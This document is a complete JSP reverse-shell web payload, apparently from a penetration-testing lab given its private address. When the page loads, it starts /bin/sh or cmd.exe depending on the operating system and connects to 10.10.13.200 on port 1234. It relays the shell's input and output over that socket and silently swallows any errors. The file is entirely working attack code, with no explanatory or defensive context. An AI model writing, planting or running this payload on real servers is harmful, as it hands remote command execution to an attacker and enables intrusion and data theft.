<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream nf;
    OutputStream yz;

    StreamConnector( InputStream nf, OutputStream yz )
    {
      this.nf = nf;
      this.yz = yz;
    }

    public void run()
    {
      BufferedReader dn  = null;
      BufferedWriter gus = null;
      try
      {
        dn  = new BufferedReader( new InputStreamReader( this.nf ) );
        gus = new BufferedWriter( new OutputStreamWriter( this.yz ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = dn.read( buffer, 0, buffer.length ) ) > 0 )
        {
          gus.write( buffer, 0, length );
          gus.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( dn != null )
          dn.close();
        if( gus != null )
          gus.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.13.200", 1234 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
